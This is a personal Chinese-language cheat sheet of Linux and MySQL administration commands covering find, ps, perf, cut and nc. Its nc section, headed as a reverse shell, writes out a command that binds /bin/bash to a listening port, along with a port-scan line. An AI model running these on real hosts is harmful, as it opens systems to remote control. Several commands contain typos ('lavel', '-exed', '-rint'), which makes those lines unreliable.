# mysql
select @@transaction_isolation;
# global 全局 session 会话
set global transaction isolation lavel read uncommited 
# 查看最大连接数 max_used_connections / max_connections * 100% 一般要求超过10%
show variables like '%max_connections%';
show variables like '%max_user_connections%';
show engines; # 查看所有存储引擎
show variables like '%storage_engine%'; # 查看默认存储引擎
show table status like "table_name" ; # 查看表存储引擎
analyze table tablename  # 重建索引基数
netstat -s | grep "listen" # overflow一直增加accept队列太小,连接等待处理时间过长
ss —lnt      # 查看accept队列大小
enable       # 查看 bash 内置命令
type         # 区分外部命令和内置命令
help         # 获取内置命令帮助,不适用于外部命令
man、info    # info 可以更完整的帮助
groupadd、groupdel、groupmod # 组操作
useradd、userdel、usermod、id         # 用户操作,id 判断用户是否存在
passwd                      #修改密码
who、whoami
paste、join  # 合并文件
lscpu # 查看 cpu 核数
cat /proc/cpuinfo # 查看每个 cpu 核信息

/etc/group                  # 账户信息
/etc/gshadow                # 安全组账户信息
/etc/login.defs             # 密码套件
/etc/passwd                 # 用户和组信息
perf top -s comm # 当前系统运行占比
perf record # 记录采样信息
perf report -s comm
netstat -n | awk '/^tcp/ {++S[$NF]} END {for (i in S) print i, s[i]}' # 统计 tcp 各种状态链接的数量
find . ( -name "*.txt" -o -name "*.pdf" ) -print # 查找 pdf 和txt 文件
find . -regex ".*(.txt|.pdf)$ "  # 查找 pdf 和txt 文件,-iregex 忽略大小写的正则
find . ! -name "*.txt" -print # 否定查找
find . -maxdepth 1 -type f # 当前目录下文件
find . -atime 7 -type f -rint # 7 天被访问过的文件,atime 访问时间,单位是天,分钟则是 amin,mtime 修改时间,ctime 创建时间
find . -type f -size +2k
find . -type f -perm 644
find . -user where -print
find . -type f -name "*.swp" --delete
find . -type f -user "root" -exed chown where {}; # 对于每一个文件{}都会替换成相应的文件名
find . -type f -mtime +10 -name ".txt" -exec cp {} OLD;
ps -aux --sort -pcpu | less # 根据 cpu 使用率升序排序
ps -aux --sort -pmem | less # 根据 内存使用率升序排序
ps -aux --sort -pcpu,+pmem | head -n 10
ps -L pid # 特定进程的线程
ps -axjf # 树型显示进程
watch -n 1 `ps -aux --sort -pmem,-pcpu` # 每秒刷新一次
sed -i '1 d' file # 删除行首
sed –n 'n p' file | wc –c # 获取长度, n 行号
top shift + t # cpu 使用时间排序
perf top -p pid # 采样
openssl rand -base64 6 # 生成随机密码
TZ=UTC-8 date +%Y # utc 时间
host domain.com # DNS 查询命令

# cpu利用率 & 平均负载

# cut

从一个字符串中以字节、字符、字段(分隔符)截取一部分出来.不支持指定多个字符做分隔符,多格空格会被当作多个字段分隔符,使用命令前通过 tr 去除空格.

参数 作用
f 提取指定字段,逗号或连字符,可同时使用
d 指定分隔符,默认 tab 分隔符
b 提取指定字节,逗号或连字符,可同时使用
c 提取指定字符,逗号或连字符,可同时使用
complement 反选
output-delimiter 修改输出时使用的分隔符,默认和输入分隔符一样
only-delimited 不输出不包含分隔符的列
cut -cn- # 第 n 个字符到最后一个字符
cut -c-n # 第 1 个字符到第 n 个字符

# nc

# 反弹 shell
nc -l -vv -p 80 -e /bin/bash # 机器上开放端口
nc -v ip port # 客户端远程连接, -k 客户端关闭后服务器继续监听
# 传输文件
nc -l 80 > file # 监听端口,重定向到文件
nc -v ip port < file # 非加密传输文件,反向箭头,传输完后可以 md5 校验
nc -l port | tar xfvz - # 传输目录,服务端
tar cfz - file | nc -l ip port # 传输目录,客户端
# 网路连同性检测
nc -vvv baidu.com 443
nc -vzww 2 ip port1-port2 # 扫描主机端口开放情况
# 防火墙穿透
ssh -A -t ip1 ssh -A -t ip2 ssh -A ip3 # 通过 ip2 访问 ip3
ssh -oProxyCommand = "ssh host1 nc host2 port" host2

ncat -lkp port --sh-exec 'echo -ne "HTTP1.0 200 OK\r\n\r\n The date is";date;' # 时间服务器
